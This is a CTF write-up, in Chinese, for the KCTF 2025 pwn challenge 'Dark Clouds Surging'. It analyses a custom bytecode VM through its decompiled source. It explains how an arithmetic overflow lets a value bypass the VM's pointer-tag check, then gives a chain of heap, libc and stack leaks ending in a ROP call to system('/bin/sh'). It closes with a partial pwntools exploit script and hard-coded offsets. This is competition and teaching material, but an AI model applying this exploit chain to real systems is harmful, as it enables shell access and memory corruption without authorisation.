# 2025 KCTF | 第八题《暗云涌动》设计思路及解析

> 原文: https://www.ctfiot.com/267740.html
> ID: 267740

KCTF评委团队点评：

这道Pwn题设计了一个自定义虚拟机，通过精妙的指针标记与算术运算规则，在ALU操作中隐藏了整数溢出漏洞：当两个非指针数值运算后高位溢出成为“指针”时，可绕过adjust_pointer校验，实现任意地址读写。利用需结合堆地址爆破、libc偏移计算和IO链劫持，综合考察了虚拟机逆向、漏洞链构造和爆破技巧，难度较高但逻辑严密。

一起来看看本题的设计思路和解题思路吧～

一、

设计思路

出题团队：星盟安全团队

0x4000000000200000 +  0x4000000000000000 = 0x8000000000200000通用寄存器 + 通用寄存器 = 指针寄存器

adjust_pointer(invalid_pointer) = data_pointeradjust_pointer(stack_addr) = stack_addr

二、

赛题解析

一、结构体与内存布局（修正类型）

// 依据用法还原

typedef struct VM {

uint32_t pc;           // ctx->pc        程序计数器（按“指令”为单位）

uint32_t sp;           // ctx->field_4   栈指针（元素个数，单位=8字节槽）

uint64_t *stack;       // ctx->field_8   (256 个 QWORD，大小 0x800)

uint8_t  *dmem;        // ctx->field_10  (mmap 到 0x200000, 0x1000 字节)

uint8_t  *imem;        // ctx->instructions (0x1000 字节, 512条 * 8B)

uint64_t *regs;        // ctx->field_20  (8个 QWORD，大小 0x40)

} VM;

initcontext() 布置：

imem = zmmap(NULL, 0x1000)（随机基址）

dmem = zmmap((void*)0x200000, 0x1000)（必须成功映射到固定地址 0x200000，否则退出）

regs = zalloc(0x40)（8×8B）

stack = zalloc(0x800)（256×8B）

pc = 0; sp = 0;

read(0, imem, 0x1000) 直接把字节码读入 imem。

freecontext() 会相应 unmap/free。

关键说明：run() 里这句

v2 = &ctx->instructions[ctx->pc++]; ctx->pc = bound(ctx->pc, 0x200);

结合 instructions 在反编译里被误识别为 _BYTE **，使得索引按 8 字节步长移动（指令宽度 8B）。正确语义应是：取 imem + 8*pc 为当前 8 字节指令，然后 pc++。这和各指令内部通过 a1+1/2/4 取操作数完全吻合。

二、工具函数 & 语义

bound(x, lim)：若 x < lim 返回 x，否则返回 0。

用于寄存器号（<8）、栈指针（<256）、pc（<512） 的包回 0式“限幅”。这不是饱和（saturate），而是越界就变 0。

指针标记与校验

标记位：最高位（bit63）=1 表示“被 VM 认可的指针”。sub_12FE(v)=v>>63 判断是否是“指针”。

打标函数 sub_128B(p)（核心）

若 p 落在 dmem（ctx->field_10，0x1000 大小）的 [..+0xFF8] 或落在 stack（0x800 大小）的 [..+0x7F8]，返回 p | 0x8000_0000_0000_0000；

否则返回 dmem_base | 0x8000...（即强行变成指向 0x200000 的“有效指针”）。

算术/位运算后的指针传播规则（见各算术/位运算指令）：

若两个操作数都带标：清掉最高位（结果变“非指针”）；

若只一个带标：对去掉标记位后的数值调用 sub_128B 重新打标（确保仍指向 dmem 或 stack；若不在范围则被改成指向 dmem_base）。

三、指令编码与效果（每条 8 字节）

通用 8B 格式：

[0]: opcode | [1]: r1(dst) | [2]: r2(src) | [3]: 未用/保留(0) | [4..7]: imm32 (LE)

寄存器：8 个（0..7），每个 64 位。r = bound(byte,8)，越界自动变 0。

栈：256 槽（QWORD），sp 是“已用槽数”；越界/下溢同样回 0。

数据移动

0x00 pushr : push regs[r2]

0x01 pushimm : push (uint32_t)imm

0x02 pushptr : push sub_128B((uint32_t)imm)（生成“指针”）

0x03 popr : regs[r1] = pop()

0x04 mov : regs[r1] = regs[r2]

0x05 movimm : regs[r1] = (uint32_t)imm

算术（带“指针传播规则”）

0x06 add : r1 += r2

0x07 addi : r1 += imm32

0x08 sub : r1 -= r2

0x09 subi : r1 -= imm32

0x0A mul : r1 *= r2

0x0B muli : r1 *= imm32

0x0C div : r1 /= r2 （无除零检查）

0x0D divi : r1 /= imm32（无除零检查）

位运算（同样套用“指针传播规则”）

0x0E and : r1 &= r2

0x0F andi : r1 &= imm32

0x10 or : r1 |= r2

0x11 ori : r1 |= imm32

0x12 xor : r1 ^= r2

0x13 xori : r1 ^= imm32

内存读写（需“带标”指针）

0x14 load : 若 regs[r2] 带标 → regs[r1] = *(uint64_t*)(regs[r2]&~MSB)；否则打印报错

0x15 store : 若 regs[r1] 带标 → *(uint64_t*)(regs[r1]&~MSB) = regs[r2]；否则打印报错

条件跳（无符号比较），pc += imm32 后 pc = bound(pc, 0x200)

0x16 jg : if regs[r1] > regs[r2] 跳

0x17 jl : if regs[r1] < regs[r2] 跳

0x18 je : if regs[r1] == regs[r2] 跳

结束

0x19 halt

struct Inst // sizeof=0x8

{

_BYTE op;

unsigned __int8 dst;

unsigned __int8 src;

_BYTE reserved;

unsigned int imm;

};

/* This file was generated by the Hex-Rays decompiler version 9.2.0.250718.

Copyright (c) 2007-2021 Hex-Rays 

Detected compiler: GNU C++

*/

#include <defs.h>

//-------------------------------------------------------------------------

// Function declarations

// int puts(const char *s);

// void __noreturn exit(int status);

__int64 __fastcall bound(unsigned int, unsigned int);

unsigned __int64 __fastcall check_and_mark_ptr(unsigned __int64 a1);

unsigned __int64 __fastcall highestbit(unsigned __int64);

void pushr(struct Inst *a1);

void pushimm(struct Inst *a1);

void pushptr(struct Inst *a1);

void popr(struct Inst *a1);

void mov(struct Inst *a1);

void movimm(struct Inst *a1);

void add(struct Inst *a1);

void addi(struct Inst *a1);

void sub(struct Inst *a1);

void subi(struct Inst *a1);

void mul(struct Inst *a1);

void muli(struct Inst *a1);

void div(struct Inst *a1);

void divi(struct Inst *a1);

void and(struct Inst *a1);

void andi(struct Inst *a1);

void or(struct Inst *a1);

void ori(struct Inst *a1);

void xor(struct Inst *a1);

void xori(struct Inst *a1);

void load_data(struct Inst *a1);

void store_data(struct Inst *a1);

void __fastcall jg(struct Inst *a1);

void __fastcall jl(struct Inst *a1);

void __fastcall je(struct Inst *a1);

void run();

//-------------------------------------------------------------------------

// Data declarations

struct VM *vm;

//----- (0000000000001000) ----------------------------------------------------

__int64 (**init_proc())(void)

{

__int64 (**result)(void); // rax

result = &_gmon_start__;

if ( &_gmon_start__ )

return (__int64 (**)(void))_gmon_start__();

return result;

}

// 50C0: using guessed type __int64 _gmon_start__(void);

//----- (0000000000001020) ----------------------------------------------------

void sub_1020()

{

JUMPOUT(0);

}

// 1026: control flows out of bounds to 0

//----- (0000000000001030) ----------------------------------------------------

void sub_1030()

{

sub_1020();

}

//----- (0000000000001040) ----------------------------------------------------

void sub_1040()

{

sub_1020();

}

//----- (0000000000001050) ----------------------------------------------------

void sub_1050()

{

sub_1020();

}

//----- (0000000000001060) ----------------------------------------------------

void sub_1060()

{

sub_1020();

}

//----- (0000000000001070) ----------------------------------------------------

void sub_1070()

{

sub_1020();

}

//----- (0000000000001080) ----------------------------------------------------

void sub_1080()

{

sub_1020();

}

//----- (0000000000001090) ----------------------------------------------------

void sub_1090()

{

sub_1020();

}

//----- (00000000000010A0) ----------------------------------------------------

void sub_10A0()

{

sub_1020();

}

//----- (00000000000010B0) ----------------------------------------------------

void sub_10B0()

{

sub_1020();

}

//----- (00000000000010C0) ----------------------------------------------------

void sub_10C0()

{

sub_1020();

}

//----- (0000000000001180) ----------------------------------------------------

// positive sp value has been detected, the output may be wrong!

void __fastcall __noreturn start(__int64 a1, __int64 a2, void (*a3)(void))

{

__int64 v3; // rax

int v4; // esi

__int64 v5; // [rsp-8h] [rbp-8h] BYREF

char *retaddr; // [rsp+0h] [rbp+0h] BYREF

v4 = v5;

v5 = v3;

_libc_start_main((int (*)(int, char **, char **))main, v4, &retaddr, 0, 0, a3, &v5);

__halt();

}

// 118A: positive sp value 8 has been found

// 1191: variable 'v3' is possibly undefined

//----- (00000000000011B0) ----------------------------------------------------

void *sub_11B0()

{

return &unk_5010;

}

//----- (00000000000011E0) ----------------------------------------------------

__int64 sub_11E0()

{

return 0;

}

// 11E0: using guessed type __int64 sub_11E0();

//----- (0000000000001220) ----------------------------------------------------

void *sub_1220()

{

void *result; // rax

if ( !byte_5048 )

{

if ( &__cxa_finalize )

_cxa_finalize(off_5008);

result = sub_11B0();

byte_5048 = 1;

}

return result;

}

// 5048: using guessed type char byte_5048;

//----- (0000000000001260) ----------------------------------------------------

// attributes: thunk

__int64 sub_1260()

{

return sub_11E0();

}

// 11E0: using guessed type __int64 sub_11E0(void);

//----- (0000000000001269) ----------------------------------------------------

__int64 __fastcall bound(unsigned int a1, unsigned int a2)

{

if ( a1 < a2 )

return a1;

else

return 0;

}

//----- (000000000000128B) ----------------------------------------------------

unsigned __int64 __fastcall check_and_mark_ptr(unsigned __int64 a1)

{

if ( a1 - (unsigned __int64)vm->dmem <= 0xFF8 || a1 - (unsigned __int64)vm->stack <= 0x7F8 )

return a1 | 0x8000000000000000LL;

else

return (unsigned __int64)vm->dmem | 0x8000000000000000LL;

}

//----- (00000000000012FE) ----------------------------------------------------

unsigned __int64 __fastcall highestbit(unsigned __int64 a1)

{

return a1 >> 63;

}

//----- (0000000000001314) ----------------------------------------------------

void pushr(struct Inst *a1)

{

uint64_t *regs; // rbx

_QWORD *stack; // rsi

uint32_t sp; // edx

struct VM *v4; // rbx

uint64_t v5; // [rsp+10h] [rbp-10h]

regs = vm->regs;

v5 = regs[(unsigned int)bound(a1->src, 8u)];

stack = vm->stack;

sp = vm->sp;

vm->sp = sp + 1;

stack[sp] = v5;

v4 = vm;

v4->sp = bound(vm->sp, 0x100u);

}

//----- (00000000000013AA) ----------------------------------------------------

void pushimm(struct Inst *a1)

{

_QWORD *stack; // rsi

uint32_t sp; // edx

struct VM *v3; // rbx

__int64 imm; // [rsp+10h] [rbp-10h]

imm = a1->imm;

stack = vm->stack;

sp = vm->sp;

vm->sp = sp + 1;

stack[sp] = imm;

v3 = vm;

v3->sp = bound(vm->sp, 0x100u);

}

//----- (000000000000141B) ----------------------------------------------------

void pushptr(struct Inst *a1)

{

_QWORD *stack; // rsi

uint32_t sp; // edx

struct VM *v3; // rbx

unsigned __int64 v4; // [rsp+10h] [rbp-10h]

v4 = check_and_mark_ptr(a1->imm);

stack = vm->stack;

sp = vm->sp;

vm->sp = sp + 1;

stack[sp] = v4;

v3 = vm;

v3->sp = bound(vm->sp, 0x100u);

}

//----- (0000000000001494) ----------------------------------------------------

void popr(struct Inst *a1)

{

struct VM *v1; // rbx

uint64_t *v2; // rbx

uint64_t *regs; // r12

--vm->sp;

v1 = vm;

v1->sp = bound(vm->sp, 0x100u);

v2 = &vm->stack[vm->sp];

regs = vm->regs;

regs[(unsigned int)bound(a1->dst, 8u)] = *v2;

}

//----- (0000000000001532) ----------------------------------------------------

void mov(struct Inst *a1)

{

uint64_t *regs; // rbx

uint64_t *v2; // rbx

uint64_t *v3; // r12

regs = vm->regs;

v2 = &regs[(unsigned int)bound(a1->src, 8u)];

v3 = vm->regs;

v3[(unsigned int)bound(a1->dst, 8u)] = *v2;

}

//----- (00000000000015AC) ----------------------------------------------------

void movimm(struct Inst *a1)

{

unsigned int imm; // ebx

uint64_t *regs; // r12

imm = a1->imm;

regs = vm->regs;

regs[(unsigned int)bound(a1->dst, 8u)] = imm;

}

//----- (0000000000001600) ----------------------------------------------------

void add(struct Inst *a1)

{

uint64_t *v1; // rbx

unsigned __int8 v2; // [rsp+14h] [rbp-Ch]

char v3; // [rsp+15h] [rbp-Bh]

unsigned __int8 v4; // [rsp+16h] [rbp-Ah]

char v5; // [rsp+17h] [rbp-9h]

v2 = bound(a1->dst, 8u);

v3 = highestbit(vm->regs[v2]);

v4 = bound(a1->src, 8u);

v5 = highestbit(vm->regs[v4]);

vm->regs[v2] += vm->regs[v4];

if ( v3 || v5 )

{

if ( v3 && v5 )

{

vm->regs[v2] &= ~0x8000000000000000LL;

}

else

{

v1 = &vm->regs[v2];

*v1 = check_and_mark_ptr(*v1 & 0x7FFFFFFFFFFFFFFFLL);

}

}

}

//----- (0000000000001787) ----------------------------------------------------

void addi(struct Inst *a1)

{

uint64_t *v1; // rbx

unsigned __int8 v2; // [rsp+17h] [rbp-9h]

v2 = bound(a1->dst, 8u);

vm->regs[v2] += a1->imm;

if ( (unsigned __int8)highestbit(vm->regs[v2]) )

{

v1 = &vm->regs[v2];

*v1 = check_and_mark_ptr(*v1 & 0x7FFFFFFFFFFFFFFFLL);

}

}

//----- (0000000000001864) ----------------------------------------------------

void sub(struct Inst *a1)

{

uint64_t *v1; // rbx

unsigned __int8 v2; // [rsp+14h] [rbp-Ch]

char v3; // [rsp+15h] [rbp-Bh]

unsigned __int8 v4; // [rsp+16h] [rbp-Ah]

char v5; // [rsp+17h] [rbp-9h]

v2 = bound(a1->dst, 8u);

v3 = highestbit(vm->regs[v2]);

v4 = bound(a1->src, 8u);

v5 = highestbit(vm->regs[v4]);

vm->regs[v2] -= vm->regs[v4];

if ( v3 || v5 )

{

if ( v3 && v5 )

{

vm->regs[v2] &= ~0x8000000000000000LL;

}

else

{

v1 = &vm->regs[v2];

*v1 = check_and_mark_ptr(*v1 & 0x7FFFFFFFFFFFFFFFLL);

}

}

}

//----- (00000000000019EB) ----------------------------------------------------

void subi(struct Inst *a1)

{

uint64_t *v1; // rbx

unsigned __int8 v2; // [rsp+17h] [rbp-9h]

v2 = bound(a1->dst, 8u);

vm->regs[v2] -= a1->imm;

if ( (unsigned __int8)highestbit(vm->regs[v2]) )

{

v1 = &vm->regs[v2];

*v1 = check_and_mark_ptr(*v1 & 0x7FFFFFFFFFFFFFFFLL);

}

}

//----- (0000000000001AC8) ----------------------------------------------------

void mul(struct Inst *a1)

{

uint64_t *v1; // rbx

unsigned __int8 v2; // [rsp+14h] [rbp-Ch]

char v3; // [rsp+15h] [rbp-Bh]

unsigned __int8 v4; // [rsp+16h] [rbp-Ah]

char v5; // [rsp+17h] [rbp-9h]

v2 = bound(a1->dst, 8u);

v3 = highestbit(vm->regs[v2]);

v4 = bound(a1->src, 8u);

v5 = highestbit(vm->regs[v4]);

vm->regs[v2] *= vm->regs[v4];

if ( v3 || v5 )

{

if ( v3 && v5 )

{

vm->regs[v2] &= ~0x8000000000000000LL;

}

else

{

v1 = &vm->regs[v2];

*v1 = check_and_mark_ptr(*v1 & 0x7FFFFFFFFFFFFFFFLL);

}

}

}

//----- (0000000000001C53) ----------------------------------------------------

void muli(struct Inst *a1)

{

uint64_t *v1; // rbx

unsigned __int8 v2; // [rsp+17h] [rbp-9h]

v2 = bound(a1->dst, 8u);

vm->regs[v2] *= a1->imm;

if ( (unsigned __int8)highestbit(vm->regs[v2]) )

{

v1 = &vm->regs[v2];

*v1 = check_and_mark_ptr(*v1 & 0x7FFFFFFFFFFFFFFFLL);

}

}

//----- (0000000000001D34) ----------------------------------------------------

void div(struct Inst *a1)

{

uint64_t *v1; // rbx

unsigned __int8 v2; // [rsp+14h] [rbp-Ch]

char v3; // [rsp+15h] [rbp-Bh]

unsigned __int8 v4; // [rsp+16h] [rbp-Ah]

char v5; // [rsp+17h] [rbp-9h]

v2 = bound(a1->dst, 8u);

v3 = highestbit(vm->regs[v2]);

v4 = bound(a1->src, 8u);

v5 = highestbit(vm->regs[v4]);

vm->regs[v2] /= vm->regs[v4];

if ( v3 || v5 )

{

if ( v3 && v5 )

{

vm->regs[v2] &= ~0x8000000000000000LL;

}

else

{

v1 = &vm->regs[v2];

*v1 = check_and_mark_ptr(*v1 & 0x7FFFFFFFFFFFFFFFLL);

}

}

}

//----- (0000000000001EC0) ----------------------------------------------------

void divi(struct Inst *a1)

{

uint64_t *v1; // rbx

unsigned __int8 v2; // [rsp+17h] [rbp-9h]

v2 = bound(a1->dst, 8u);

vm->regs[v2] /= a1->imm;

if ( (unsigned __int8)highestbit(vm->regs[v2]) )

{

v1 = &vm->regs[v2];

*v1 = check_and_mark_ptr(*v1 & 0x7FFFFFFFFFFFFFFFLL);

}

}

//----- (0000000000001FA2) ----------------------------------------------------

void and(struct Inst *a1)

{

uint64_t *v1; // rbx

unsigned __int8 v2; // [rsp+14h] [rbp-Ch]

char v3; // [rsp+15h] [rbp-Bh]

unsigned __int8 v4; // [rsp+16h] [rbp-Ah]

char v5; // [rsp+17h] [rbp-9h]

v2 = bound(a1->dst, 8u);

v3 = highestbit(vm->regs[v2]);

v4 = bound(a1->src, 8u);

v5 = highestbit(vm->regs[v4]);

vm->regs[v2] &= vm->regs[v4];

if ( v3 || v5 )

{

if ( v3 && v5 )

{

vm->regs[v2] &= ~0x8000000000000000LL;

}

else

{

v1 = &vm->regs[v2];

*v1 = check_and_mark_ptr(*v1 & 0x7FFFFFFFFFFFFFFFLL);

}

}

}

//----- (0000000000002129) ----------------------------------------------------

void andi(struct Inst *a1)

{

uint64_t *v1; // rbx

unsigned __int8 v2; // [rsp+17h] [rbp-9h]

v2 = bound(a1->dst, 8u);

vm->regs[v2] &= a1->imm;

if ( (unsigned __int8)highestbit(vm->regs[v2]) )

{

v1 = &vm->regs[v2];

*v1 = check_and_mark_ptr(*v1 & 0x7FFFFFFFFFFFFFFFLL);

}

}

//----- (0000000000002206) ----------------------------------------------------

void or(struct Inst *a1)

{

uint64_t *v1; // rbx

unsigned __int8 v2; // [rsp+14h] [rbp-Ch]

char v3; // [rsp+15h] [rbp-Bh]

unsigned __int8 v4; // [rsp+16h] [rbp-Ah]

char v5; // [rsp+17h] [rbp-9h]

v2 = bound(a1->dst, 8u);

v3 = highestbit(vm->regs[v2]);

v4 = bound(a1->src, 8u);

v5 = highestbit(vm->regs[v4]);

vm->regs[v2] |= vm->regs[v4];

if ( v3 || v5 )

{

if ( v3 && v5 )

{

vm->regs[v2] &= ~0x8000000000000000LL;

}

else

{

v1 = &vm->regs[v2];

*v1 = check_and_mark_ptr(*v1 & 0x7FFFFFFFFFFFFFFFLL);

}

}

}

//----- (000000000000238D) ----------------------------------------------------

void ori(struct Inst *a1)

{

uint64_t *v1; // rbx

unsigned __int8 v2; // [rsp+17h] [rbp-9h]

v2 = bound(a1->dst, 8u);

vm->regs[v2] |= a1->imm;

if ( (unsigned __int8)highestbit(vm->regs[v2]) )

{

v1 = &vm->regs[v2];

*v1 = check_and_mark_ptr(*v1 & 0x7FFFFFFFFFFFFFFFLL);

}

}

//----- (000000000000246A) ----------------------------------------------------

void xor(struct Inst *a1)

{

uint64_t *v1; // rbx

unsigned __int8 v2; // [rsp+14h] [rbp-Ch]

char v3; // [rsp+15h] [rbp-Bh]

unsigned __int8 v4; // [rsp+16h] [rbp-Ah]

char v5; // [rsp+17h] [rbp-9h]

v2 = bound(a1->dst, 8u);

v3 = highestbit(vm->regs[v2]);

v4 = bound(a1->src, 8u);

v5 = highestbit(vm->regs[v4]);

vm->regs[v2] ^= vm->regs[v4];

if ( v3 || v5 )

{

if ( v3 && v5 )

{

vm->regs[v2] &= ~0x8000000000000000LL;

}

else

{

v1 = &vm->regs[v2];

*v1 = check_and_mark_ptr(*v1 & 0x7FFFFFFFFFFFFFFFLL);

}

}

}

//----- (00000000000025F1) ----------------------------------------------------

void xori(struct Inst *a1)

{

uint64_t *v1; // rbx

unsigned __int8 v2; // [rsp+17h] [rbp-9h]

v2 = bound(a1->dst, 8u);

vm->regs[v2] ^= a1->imm;

if ( (unsigned __int8)highestbit(vm->regs[v2]) )

{

v1 = &vm->regs[v2];

*v1 = check_and_mark_ptr(*v1 & 0x7FFFFFFFFFFFFFFFLL);

}

}

//----- (00000000000026CE) ----------------------------------------------------

void load_data(struct Inst *a1)

{

uint64_t *regs; // rbx

uint64_t *v2; // r12

unsigned __int64 v3; // [rsp+18h] [rbp-18h]

regs = vm->regs;

v3 = regs[(unsigned int)bound(a1->src, 8u)];

if ( (unsigned __int8)highestbit(v3) )

{

v2 = vm->regs;

v2[(unsigned int)bound(a1->dst, 8u)] = *(_QWORD *)(v3 & 0x7FFFFFFFFFFFFFFFLL);

}

else

{

puts("Can't load data from the invalid pointer.");

}

}

//----- (0000000000002782) ----------------------------------------------------

void store_data(struct Inst *a1)

{

uint64_t *regs; // rbx

uint64_t *v2; // rbx

unsigned __int64 v3; // [rsp+18h] [rbp-18h]

regs = vm->regs;

v3 = regs[(unsigned int)bound(a1->dst, 8u)];

if ( (unsigned __int8)highestbit(v3) )

{

v2 = vm->regs;

*(_QWORD *)(v3 & 0x7FFFFFFFFFFFFFFFLL) = v2[(unsigned int)bound(a1->src, 8u)];

}

else

{

puts("Can't store data to the invalid address.");

}

}

//----- (0000000000002831) ----------------------------------------------------

void __fastcall jg(struct Inst *a1)

{

struct VM *v1; // rbx

unsigned __int8 v2; // [rsp+16h] [rbp-Ah]

v2 = bound(a1->dst, 8u);

if ( vm->regs[v2] > vm->regs[(unsigned __int8)bound(a1->src, 8u)] )

{

vm->pc += a1->imm;

v1 = vm;

v1->pc = bound(vm->pc, 0x200u);

}

}

//----- (00000000000028ED) ----------------------------------------------------

void __fastcall jl(struct Inst *a1)

{

struct VM *v1; // rbx

unsigned __int8 v2; // [rsp+16h] [rbp-Ah]

v2 = bound(a1->dst, 8u);

if ( vm->regs[v2] < vm->regs[(unsigned __int8)bound(a1->src, 8u)] )

{

vm->pc += a1->imm;

v1 = vm;

v1->pc = bound(vm->pc, 0x200u);

}

}

//----- (00000000000029A9) ----------------------------------------------------

void __fastcall je(struct Inst *a1)

{

struct VM *v1; // rbx

unsigned __int8 v2; // [rsp+16h] [rbp-Ah]

v2 = bound(a1->dst, 8u);

if ( vm->regs[v2] == vm->regs[(unsigned __int8)bound(a1->src, 8u)] )

{

vm->pc += a1->imm;

v1 = vm;

v1->pc = bound(vm->pc, 0x200u);

}

}

//----- (0000000000002A65) ----------------------------------------------------

void *__fastcall zalloc(size_t a1)

{

void *s; // [rsp+18h] [rbp-8h]

s = malloc(a1);

if ( !s )

{

puts("Failed to zalloc.");

exit(0);

}

memset(s, 0, a1);

return s;

}

//----- (0000000000002AC0) ----------------------------------------------------

void __fastcall zfree(void *a1, size_t a2)

{

memset(a1, 0, a2);

free(a1);

}

//----- (0000000000002AF8) ----------------------------------------------------

void *__fastcall zmmap(void *a1, size_t a2)

{

void *v3; // [rsp+18h] [rbp-8h]

v3 = mmap(a1, a2, 3, 34, -1, 0);

if ( !v3 || a1 && a1 != v3 )

{

puts("Failed to zmmap.");

exit(0);

}

return v3;

}

//----- (0000000000002B6D) ----------------------------------------------------

int __fastcall zmunmap(void *a1, size_t a2)

{

return munmap(a1, a2);

}

//----- (0000000000002B97) ----------------------------------------------------

void run()

{

struct VM *v0; // rbx

char v1; // [rsp+7h] [rbp-19h]

struct Inst *a1; // [rsp+8h] [rbp-18h]

v1 = 0;

while ( !v1 )

{

a1 = &vm->imem[vm->pc++];

v0 = vm;

v0->pc = bound(vm->pc, 0x200u);

switch ( a1->op )

{

case 0:

pushr(a1);

break;

case 1:

pushimm(a1);

break;

case 2:

pushptr(a1);

break;

case 3:

popr(a1);

break;

case 4:

mov(a1);

break;

case 5:

movimm(a1);

break;

case 6:

add(a1);

break;

case 7:

addi(a1);

break;

case 8:

sub(a1);

break;

case 9:

subi(a1);

break;

case 0xA:

mul(a1);

break;

case 0xB:

muli(a1);

break;

case 0xC:

div(a1);

break;

case 0xD:

divi(a1);

break;

case 0xE:

and(a1);

break;

case 0xF:

andi(a1);

break;

case 0x10:

or(a1);

break;

case 0x11:

ori(a1);

break;

case 0x12:

xor(a1);

break;

case 0x13:

xori(a1);

break;

case 0x14:

load_data(a1);

break;

case 0x15:

store_data(a1);

break;

case 0x16:

jg(a1);

break;

case 0x17:

jl(a1);

break;

case 0x18:

je(a1);

break;

case 0x19:

v1 = 1;

break;

default:

puts("Invalid instruction.");

exit(0);

}

}

}

//----- (0000000000002DF5) ----------------------------------------------------

void freecontext()

{

zmunmap(vm->?, 0x1000u);

zmunmap((void *)vm->?, 0x1000u);

zfree((void *)vm->?, 0x40u);

zfree((void *)vm->?, 0x800u);

zfree(vm, 0x28u);

}

//----- (0000000000002E74) ----------------------------------------------------

struct VM *initcontext()

{

struct VM *v0; // rbx

struct VM *v1; // rbx

struct VM *v2; // rbx

struct VM *v3; // rbx

struct VM *result; // rax

alarm(100u);

vm = (struct VM *)zalloc(0x28u);

vm->pc = 0;

v0 = vm;

v0->imem = (uint64_t *)zmmap(0, 0x1000u);

v1 = vm;

v1->dmem = (uint8_t *)zmmap((void *)0x200000, 0x1000u);

v2 = vm;

v2->regs = (uint64_t *)zalloc(0x40u);

v3 = vm;

v3->stack = (uint8_t *)zalloc(0x800u);

result = vm;

vm->sp = 0;

return result;

}

//----- (0000000000002F1C) ----------------------------------------------------

void setio()

{

setbuf(stdin, 0);

setbuf(stdout, 0);

setbuf(stderr, 0);

}

//----- (0000000000002F63) ----------------------------------------------------

__int64 __fastcall main(__int64 a1, char **a2, char **a3)

{

setio();

initcontext();

read(0, vm->imem, 0x1000u);

run();

freecontext();

return 0;

}

//----- (0000000000002FB8) ----------------------------------------------------

void term_proc()

{

;

}

// nfuncs=79 queued=55 decompiled=55 lumina nreq=0 worse=0 better=0

// ALL OK, 55 function(s) have been successfully decompiled

任意内存读写原语：让两个高位为0的虚拟寄存器经过算术指令自然溢出使得结果的高位为1，可绕开检查，然后使用访存指令

堆地址获取：用堆区地址的ASLR随机化范围内的值使用算术指令走触发check_and_mark_ptr(sub_128B)检查的路径，根据结果是否等于vm->dmem|0x8000000000000000(即常量0x8000000000200000)确定是否位于vm->stack的范围内，得到一个堆地址

libc地址获取：堆区结构在不同环境下稳定，从堆地址固定偏移出读出vm->imem的值，得到一个mmap映射地址；libc地址与这个映射地址的偏移是固定的（但是不同的环境下偏移值可能不同，需要尽可能复现远程的部署环境）

栈地址获取：libc固定偏移处的environ全局变量的值

覆盖程序返回地址，写ROP执行system(“/bin/sh”)：程序返回地址与栈上environ的偏移固定(且只要argv的参数数量相同,在不同环境下也稳定)，’pop rdi ; ret’的gadget以及system函数和字符串”/bin/sh”的地址都可以从libc的固定偏移处找到

from pwn import *

# context.terminal = ["tmux", "split", "-h"]

# context.log_level = "critical"

context.arch = "amd64"

def pack_inst(op, dst, src, imm):

return p8(op) + p8(dst) + p8(src) + p8(0) + p32(imm & 0xffffffff)

def parse_reg(t):

assert t.startswith("r"), t

reg_num = int(t[1:])

assert 0 <= reg_num < 8

return reg_num

def parse_imm(t):

if t.startswith("0x") or t.startswith("0X") or set(t) & set("ABCDEFabcdef"):

return int(t, 16)

else:

return int(t, 10)

opmap_alu = {

"add": [6, 7],

"sub": [8, 9],

"mul": [0xa, 0xb],

"div": [0xc, 0xd],

"and": [0xe, 0xf],

"or": [0x10, 0x11],

"xor": [0x12, 0x13],

}

opmap_jcc = {

"jg": 0x16,

"jl": 0x17,

"je": 0x18,

}

def assemble_one(s):

tokens = s.replace(",", " ").strip().split()

opstr = tokens[0]

part1 = tokens[1] if len(tokens) >= 2 else None

op, dst, src, imm = 0, 0, 0, 0

if opstr == "push":

if part1.startswith("r"):

op, src = 0, parse_reg(part1)

else:

op, imm = 1, parse_imm(part1)

elif opstr == "pop":

op, dst = 3, parse_reg(part1)

elif opstr == "mov":

part2 = tokens[2]

if part2.startswith("["):

op, dst, src = 0x14, parse_reg(part1), parse_reg(part2.removeprefix("[").removesuffix("]"))

elif part1.startswith("["):

op, dst, src = 0x15, parse_reg(part1.removeprefix("[").removesuffix("]")), parse_reg(part2)

else:

dst = parse_reg(part1)

if part2.startswith("r"):

op, src = 4, parse_reg(part2)

else:

op, imm = 5, parse_imm(part2)

elif opstr in opmap_alu:

part2 = tokens[2]

dst = parse_reg(part1)

if part2.startswith("r"):

op, src = opmap_alu[opstr][0], parse_reg(part2)

else:

op, imm = opmap_alu[opstr][1], parse_imm(part2)

elif opstr in opmap_jcc:

part2, part3 = tokens[2], tokens[3]

op, dst, src = opmap_jcc[opstr], parse_reg(part1), parse_reg(part2)   # require relocation later

elif opstr == "hlt":

op = 0x19

else:

assert 0, s

return pack_inst(op, dst, src, imm)

def assemble(ss):

s_list = ss.split("n")

current_pc = 0

symbol_table = {}

inst_list = []

for s in s_list:

s = s.strip()

if not s or s.startswith("#") or s.startswith("//"):

continue

tokens = s.split()

if tokens[0].endswith(":"):

symbol_table[tokens[0].removesuffix(":")] = current_pc

else:

inst = assemble_one(s)

jmp_target = None

if inst[0] in {0x16, 0x17, 0x18}:

jmp_target = tokens[3]    # jxx dst, src, label

inst_list.append((inst, jmp_target))

current_pc += 1

final_inst_list = []

for i, (inst, jmp_target) in enumerate(inst_list):

pc = i + 1

if jmp_target is not None:

pc_offset = symbol_table[jmp_target] - pc

inst = inst[:4] + p32(pc_offset & 0xffffffff)

final_inst_list.append(inst)

return b"".join(final_inst_list)

def code_load_u64(reg, n):

assert n == n & 0x7fffffffffffffff

assert n == (n >> 31) * (1 << 31) + (n & 0x7fffffff)

r = f"""

mov r{reg}, {n >> 31}

mul r{reg}, {1 << 31}

add r{reg}, {n & 0x7fffffff}

"""

return r

heap_imem_mmap_pointer_offset = 0x548  # 0x55555555c800 - 0x55555555c2b8  # 0x548 , offset of head addr to pointer to imem mmap

# 0x155555551000 - 0x1555552e9000  # 0x26800 , offset of imem mmap and libc base without aslr

# mmap_imem_libc_offset = 0x7fbb86b63000 - 0x7fbb86901000  # 0x262000 , offset of imem mmap and libc base with aslr

# mmap_imem_libc_offset = 0x280000  # fix this on real ubuntu 22.04

# mmap_imem_libc_offset = 0x263000  # fix this on real ubuntu 22.04 in docker xinetd

# mmap_imem_libc_offset = 0x264000

mmap_imem_libc_offset = 0x262000  # finally, this one can get remote flag, but not stable, must try many times and some times success once

'''

import sys

if len(sys.argv) >= 2 and sys.argv[1].startswith("0x"):

mmap_imem_libc_offset = int(sys.argv[1], 16)

print("mmap_imem_libc_offset", hex(mmap_imem_libc_offset))

'''

stack_environ_return_address_offset = 0x130  # 0x7fff9a6332b8 - 0x7fff9a633188  # 0x130 , offset of environ and return address at stack

# system_libc_offset = 0x50900  # this is address of do_system, not system, because its first inst is a 2-byte push, or can use 0x50902 for stack alignment

